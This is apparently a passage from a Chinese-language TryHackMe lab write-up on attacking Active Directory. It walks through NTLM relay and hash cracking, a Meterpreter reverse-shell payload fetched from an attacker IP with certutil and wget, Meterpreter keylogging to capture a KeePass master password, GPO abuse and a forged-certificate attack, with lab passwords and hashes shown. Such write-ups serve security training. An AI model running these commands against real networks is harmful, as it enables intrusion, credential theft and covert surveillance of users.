<span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlmrelayx.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-smb2support</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-t</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">smb://10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-c</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;whoami /all&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-debug</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 拿 Flag</span></span>
<span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlmrelayx.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-smb2support</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-t</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">smb://10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-c</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;powershell -c </span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">Get-Content C:/Users/Administrator.ZA/Desktop/flag3.txt</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-debug</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 进 SMB 会话</span></span>
<span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlmrelayx.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-smb2support</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-t</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">smb://10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-debug</span></span>
<span class="line"><span style="color: #61AFEF">nc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11000</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># RDP 连接到机器</span></span>
<span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:thmwrk1.za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/d:za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:t2_melanie.davies</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:Pass123...</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/timeout:60000</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">C:\Tools\SpoolSample.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">THMSERVER2.za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.50.57.85&quot;</span></span></code></pre></div></div></figure>

<p>同时可以提取用户的 Hash 去爆破</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># Hashdump 要 10 分钟以上</span></span>
<span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlmrelayx.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-smb2support</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-t</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">smb://10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-debug</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::</span></span>
<span class="line"><span style="color: #61AFEF">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span>
<span class="line"><span style="color: #61AFEF">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span>
<span class="line"><span style="color: #61AFEF">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::</span></span>
<span class="line"><span style="color: #61AFEF">vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::</span></span>
<span class="line"><span style="color: #61AFEF">trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 用 Hashcat 爆破密码</span></span>
<span class="line"><span style="color: #61AFEF">./hashcat.exe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hash.txt</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rockyou.txt</span></span>
<span class="line"><span style="color: #61AFEF">31d6cfe0d16ae931b73c59d7e0c089c0:</span></span>
<span class="line"><span style="color: #61AFEF">Approaching</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">final</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keyspace</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">-</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">workload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">adjusted.</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 破解出来 trevor.local 账户的密码 RDP 登不上去</span></span>
<span class="line"><span style="color: #61AFEF">43460d636f269c709b20049cee36ae7a:Password1@</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># SSH 也登不上去</span></span>
<span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">trevor.local@THMSERVER1.za.tryhackme.loc</span></span></code></pre></div></div></figure>

<h2 id="Exploiting-AD-Users"><a href="#Exploiting-AD-Users" class="headerlink" title="Exploiting AD Users"></a>Exploiting AD Users</h2><p>现在我们在工作站和服务器上有完整的管理权了，现在可以进行后渗透了。</p>
<p>这一节是从用户下手，收集用户的使用习惯</p>
<ul>
<li>凭证管理 - 用户如何存储其凭证。在 AD 中，这一点相当重要，因为用户可能有多套凭证，记住所有凭证可能会很麻烦，这一节会拿一个 KeePass 下手。</li>
<li>键盘记录和截屏</li>
</ul>
<h3 id="寻找密码管理器数据库"><a href="#寻找密码管理器数据库" class="headerlink" title="寻找密码管理器数据库"></a>寻找密码管理器数据库</h3><p>要找一个后缀是 <code>.kdbx</code> 的文件，这是 KeePass 的数据库文件，但是这个数据库被一个密码加密，我们还要找到这个密码。</p>
<p>这里用 Meterpreter 解决</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成小马</span></span>
<span class="line"><span style="color: #ABB2BF">msfvenom </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">p windows</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">x64</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">meterpreter</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">reverse_tcp LHOST</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">10.50</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">57.85</span><span style="color: #ABB2BF"> LPORT</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">-f</span><span style="color: #ABB2BF"> exe </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">o shell.ps1</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">msfconsole </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">q </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">x </span><span style="color: #98C379">&quot;use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.57.85; set LPORT 4444; exploit&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 下载文件</span></span>
<span class="line"><span style="color: #56B6C2">certutil.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">urlcache -split </span><span style="color: #ABB2BF">-f</span><span style="color: #ABB2BF"> http:</span><span style="color: #56B6C2">//</span><span style="color: #D19A66">10.50</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">57.85</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">8081</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">shell.ps1</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># curl 下载</span></span>
<span class="line"><span style="color: #ABB2BF">wget </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">o </span><span style="color: #56B6C2">shell.exe</span><span style="color: #ABB2BF"> http:</span><span style="color: #56B6C2">//</span><span style="color: #D19A66">10.50</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">57.85</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">8081</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">shell.ps1</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 执行小马</span></span>
<span class="line"><span style="color: #ABB2BF">.</span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">shell.ps1</span></span></code></pre></div></div></figure>

<p>找 kdbx 文件：</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">meterpreter</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">search</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:/Users/&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">.kdbx</span></span>
<span class="line"><span style="color: #61AFEF">Found</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">6</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">results...</span></span>
<span class="line"><span style="color: #ABB2BF">==================</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">Path</span><span style="color: #ABB2BF">                                                          </span><span style="color: #98C379">Size</span><span style="color: #ABB2BF"> (bytes)  Modified (</span><span style="color: #61AFEF">UTC</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #61AFEF">----</span><span style="color: #ABB2BF">                                                          </span><span style="color: #D19A66">------------</span><span style="color: #ABB2BF">  </span><span style="color: #D19A66">--------------</span></span>
<span class="line"><span style="color: #61AFEF">C:\Users\Administrator.ZA\Documents\PasswordDatabase.kdbx</span><span style="color: #ABB2BF">     </span><span style="color: #D19A66">1886</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #98C379">:45:29</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span>
<span class="line"><span style="color: #61AFEF">C:\Users\Administrator.ZA\My</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Documents</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">asswordDatabase.kdbx</span><span style="color: #ABB2BF">  </span><span style="color: #D19A66">1886</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #98C379">:45:29</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span>
<span class="line"><span style="color: #61AFEF">C:\Users\t1_trevor.jones\Documents\PasswordDatabase.kdbx</span><span style="color: #ABB2BF">      </span><span style="color: #D19A66">1886</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #98C379">:45:29</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span>
<span class="line"><span style="color: #61AFEF">C:\Users\t1_trevor.jones\My</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Documents</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">asswordDatabase.kdbx</span><span style="color: #ABB2BF">   </span><span style="color: #D19A66">1886</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-27</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span><span style="color: #98C379">:45:29</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span>
<span class="line"><span style="color: #61AFEF">C:\Users\trevor.local\Documents\PasswordDatabase.kdbx</span><span style="color: #ABB2BF">         </span><span style="color: #D19A66">2190</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-30</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #98C379">:36:02</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span>
<span class="line"><span style="color: #61AFEF">C:\Users\trevor.local\My</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Documents</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">asswordDatabase.kdbx</span><span style="color: #ABB2BF">      </span><span style="color: #D19A66">2190</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">2022</span><span style="color: #98C379">-04-30</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">11</span><span style="color: #98C379">:36:02</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-0400</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 下载文件</span></span>
<span class="line"><span style="color: #61AFEF">download</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Users\Administrator.ZA\Documents\PasswordDatabase.kdbx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">admin.kdbx</span></span>
<span class="line"><span style="color: #61AFEF">download</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;c:\Users\trevor.local\Documents\PasswordDatabase.kdbx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">trevor.kdbx</span></span></code></pre></div></div></figure>

<h3 id="寻找密码管理器主密码"><a href="#寻找密码管理器主密码" class="headerlink" title="寻找密码管理器主密码"></a>寻找密码管理器主密码</h3><p>现在就是要抓到那个数据库的密码了。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用这个命令看用户是不是活跃</span></span>
<span class="line"><span style="color: #61AFEF">ps</span><span style="color: #ABB2BF"> | </span><span style="color: #61AFEF">grep</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;explorer&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 没回显就跟着下面做</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 进 shell</span></span>
<span class="line"><span style="color: #61AFEF">shell</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 改用户的密码</span></span>
<span class="line"><span style="color: #61AFEF">net</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">user</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">trevor.local</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Pass123...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 登录 RDP</span></span>
<span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:10.200.60.201</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:trevor.local</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:Pass123...</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/timeout:60000</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看 Explorer 的 PID</span></span>
<span class="line"><span style="color: #61AFEF">ps</span><span style="color: #ABB2BF"> | </span><span style="color: #61AFEF">grep</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;explorer&quot;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 转移到用户的会话下面</span></span>
<span class="line"><span style="color: #61AFEF">migrate</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">4360</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 抓用户输入</span></span>
<span class="line"><span style="color: #61AFEF">keyscan_start</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 过2分钟执行这个，就把输入抓出来了</span></span>
<span class="line"><span style="color: #61AFEF">keyscan_dump</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">Dumping</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">captured</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keystrokes...</span></span>
<span class="line"><span style="color: #61AFEF">keep&lt;CR&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;Shift&gt;Imreallysurenoonewillguessmypassword&lt;CR&gt;</span></span></code></pre></div></div></figure>

<p>从这里下客户端：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/keepass/files/KeePass%201.x/1.43/KeePass-1.43.zip/download">https://sourceforge.net/projects/keepass/files/KeePass%201.x/1.43/KeePass-1.43.zip/download</a></p>
<p>然后导入数据库，用抓到的密码解密，两个数据库我都帮你们看了，Administrator 用户是空的数据库，那个本地用户的数据库里有货。顺利拿到 flag 和一个 svcServMan 用户的密码。</p>
<img src="/thm_ad/image-20250805212143831.png" class="" title="image-20250805212143831">

<h2 id="Exploiting-GPO"><a href="#Exploiting-GPO" class="headerlink" title="Exploiting GPO"></a>Exploiting GPO</h2><p>上一节拿到了 svcServMan 用户，我们就可以从这里下手，看看这个用户有什么用。</p>
<img src="/thm_ad/image-20250805213606577.png" class="" title="image-20250805213606577">

<p>这个攻击路径非常清晰：</p>
<ul>
<li><p>初始权限：我们拥有一个账户，它对 MANAGEMENT SERVER PUSHES GPO 拥有 GenericWrite 权限。</p>
</li>
<li><p>攻击目标：这个 GPO 通过 GpLink 链接到了 MANAGEMENT SERVER OU。</p>
</li>
<li><p>最终受害者：MANAGEMENT SERVER OU 包含了机器 THMSERVER2.ZA.TRYHACKME.LOC。</p>
</li>
</ul>
<p>因此，我们可以利用 GenericWrite 权限修改 GPO 的内容，然后这个被修改的 GPO 会自动应用到 THMSERVER2 这台机器上，从而让我们控制这台主机。</p>
<h3 id="组策略对象（GPO）"><a href="#组策略对象（GPO）" class="headerlink" title="组策略对象（GPO）"></a>组策略对象（GPO）</h3><p>GPO 是一个包含各种策略设置的虚拟集合，每台 Windows 计算机都有一个本地策略配置，可设置防火墙、用户组、启动脚本和安全协议等。在大型组织中，为了集中管理这些设置，可以使用**组策略管理（GPM）**来在 Active Directory (AD) 结构上定义 GPO。</p>
<h3 id="GPO-的存储与应用"><a href="#GPO-的存储与应用" class="headerlink" title="GPO 的存储与应用"></a>GPO 的存储与应用</h3><p>所有 GPO 都以唯一的 GUID 名称存储在 AD 的 <strong>SYSVOL</strong> 目录下，并被复制到所有加入域的机器上。域内计算机每隔 15 分钟会自动从 SYSVOL 目录拉取 GPO 并应用相关策略。也可以通过手动运行 <code>gpupdate</code> 命令来立即应用。</p>
<h3 id="Exploiting-GPOs"><a href="#Exploiting-GPOs" class="headerlink" title="Exploiting GPOs"></a>Exploiting GPOs</h3><p>在本地管理员组和本地远程桌面用户组中添加一个我们控制的 AD 账户。这样，我们就能获得 THMSERVER2 的管理权限，并能 RDP 登录。</p>
<p>为了修改 GPO，我们需要以拥有相关权限的 AD 用户身份访问组策略管理。使用 runas 命令将 AD 用户的凭据注入内存，然后打开 MMC 修改 GPO。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">svcServMan</span><span style="color: #ABB2BF"> cmd.exe</span></span>
<span class="line"><span style="color: #ABB2BF">Sup3rStr0ngPass!@</span></span>
<span class="line"><span style="color: #ABB2BF"># 验证一下密码</span></span>
<span class="line"><span style="color: #E06C75">dir</span><span style="color: #ABB2BF"> \\za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">sysvol</span></span>
<span class="line"><span style="color: #ABB2BF"># 打开 MMC</span></span>
<span class="line"><span style="color: #ABB2BF">mmc</span></span></code></pre></div></div></figure>

<p>添加好管理单元然后展开，可以看到我们现在可以编辑这个 GPO。</p>
<img src="/thm_ad/image-20250805215149176.png" class="" title="image-20250805215149176">

<p>把 IT Support 加入这个组就行。</p>
<img src="/thm_ad/image-20250805220109218.png" class="" title="image-20250805220109218">

<p>等 15 分钟左右，让 GPO 生效，这下我们一开始加入 IT Support 组的用户就有对 THMSERVER2 的管理和 RDP 权限了。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:thmserver2.za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/d:za.tryhackme.loc</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:barbara.reid</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:Password1</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/timeout:60000</span></span></code></pre></div></div></figure>

<h2 id="Exploiting-Certificates"><a href="#Exploiting-Certificates" class="headerlink" title="Exploiting Certificates"></a>Exploiting Certificates</h2><p>利用证书生成 TGT (Ticket Granting Ticket) 的机制，是 Kerberos 协议的一个扩展功能，称为 <strong>PKINIT</strong>（Public Key Cryptography for Initial Authentication in Kerberos）。</p>
<p>简单来说，PKINIT 允许客户端使用<strong>数字证书</strong>来替代传统的用户名和密码进行 Kerberos 的初始认证，也就是获取 TGT 的过程。</p>
<p>SpecterOps 所做的研究和<a target="_blank" rel="noopener" href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">发布的白皮书</a>显示，利用配置错误的证书模板进行权限升级和横向移动是可能的，主要讲的是用证书模板的一些参数，以下是示例：</p>
<ul>
<li><strong>Client Authentication</strong> - 证书可用于客户端身份验证。</li>
<li><strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong> - 证书模板允许我们指定 Subject Alternative Name (SAN)。</li>
<li><strong>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY</strong> - 证书可与私钥一起导出。</li>
<li><strong>Certificate Permissions</strong> - 我们拥有使用此证书模板所需的权限。</li>
</ul>
<h3 id="利用证书模板"><a href="#利用证书模板" class="headerlink" title="利用证书模板"></a>利用证书模板</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 导出证书模板</span></span>
<span class="line"><span style="color: #61AFEF">certutil</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-Template</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-v</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">templates.txt</span></span></code></pre></div></div></figure>

<p>[32] 号证书，我只保留了要关注的字段</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Template[32]:</span></span>
<span class="line"><span style="color: #abb2bf">	</span></span>
<span class="line"><span style="color: #abb2bf">  TemplatePropPrivateKeyFlags = 1010010 (16842768)</span></span>
<span class="line"><span style="color: #abb2bf">    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)	</span></span>
<span class="line"><span style="color: #abb2bf">  TemplatePropGeneralFlags = 20241 (131649)</span></span>
<span class="line"><span style="color: #abb2bf">    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1</span></span>
<span class="line"><span style="color: #abb2bf">    Allow Enroll	ZA\THMSERVER2$</span></span>
<span class="line"><span style="color: #abb2bf">    Allow Auto-Enroll	ZA\THMSERVER2$</span></span>
<span class="line"><span style="color: #abb2bf">    Allow Read	ZA\THMSERVER2$</span></span></code></pre></div></div></figure>

<p><strong>安全漏洞点分析</strong></p>
<ol>
<li><code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code></li>
</ol>
<p>这个标志是整个攻击的核心。它允许<strong>申请者自行指定证书的主体名称</strong>。</p>
<ul>
<li><strong>安全风险</strong>: 正常的证书申请，CA 会从你的 AD 账户信息中自动填充你的名字。但这个标志绕过了这个安全机制。</li>
<li><strong>攻击利用</strong>: 攻击者可以利用这个点，在申请证书时将主体名称伪造成<strong>任何</strong>高权限用户（比如 <code>Administrator</code>），从而冒充他人身份。</li>
</ul>
<ol start="2">
<li><code>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY</code></li>
</ol>
<p>这个标志使得私钥可以被导出。</p>
<ul>
<li><strong>安全风险</strong>: 私钥是证书的“密码”，它应该被安全地存储在设备上。如果私钥可以被导出，攻击者在获取证书后，就可以将私钥导出并保存在自己的攻击机上。</li>
<li><strong>攻击利用</strong>: 攻击者可以偷走私钥，并将其导入到自己的设备中。这样，即使目标系统上的证书被吊销，攻击者仍然可以继续使用这个私钥进行身份验证，实现<strong>持久化访问</strong>。</li>
</ul>
<ol start="3">
<li><code>Allow Enroll</code> for <code>ZA\THMSERVER2$</code></li>
</ol>
<p>这个权限配置不当，是攻击的起点。</p>
<ul>
<li><strong>安全风险</strong>: <code>THMSERVER2$</code> 是一个机器账户，通常权限较低。但这里，它被授予了申请这个证书模板的权限。</li>
<li><strong>攻击利用</strong>: 攻击者只需要攻陷 <code>THMSERVER2</code> 这台机器，就可以利用它的机器账户权限，去申请一个具备上述所有漏洞（可自定义主体、可导出私钥）的证书。</li>
</ul>
<p>这三点环环相扣，构成了<strong>一个完美的 AD 证书攻击链</strong>：</p>
<ol>
<li><strong><code>ZA\THMSERVER2$</code></strong> 拥有<strong>申请</strong>证书的权限。</li>
<li>申请时，可以<strong>伪造主体名称</strong>为 <code>Administrator</code>。</li>
<li>获得的证书的私钥<strong>可以被导出</strong>，从而实现持久化。</li>
</ol>
<h4 id="伪造证书"><a href="#伪造证书" class="headerlink" title="伪造证书"></a>伪造证书</h4><p>去 MMC 生成一张伪造 <a href="mailto:&#x41;&#x64;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#x72;&#x61;&#116;&#x6f;&#114;&#x40;&#x7a;&#x61;&#x2e;&#116;&#114;&#121;&#x68;&#x61;&#x63;&#107;&#109;&#101;&#46;&#108;&#x6f;&#99;">Administrator@za.tryhackme.loc</a> 的证书，然后<strong>带私钥</strong>导出来，带私钥是为了生成 TGT，不懂的可以回顾之前 Kerberos 认证过程。</p>
<p>现在，我们终于可以冒充用户了。要做到这一点，需要两个步骤：</p>
<ul>
<li>使用证书申请 TGT</li>
<li>将 TGT 加载到工具中</li>
</ul>
<p>第一步，我们用 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a> 工具来实现这一点：</p>
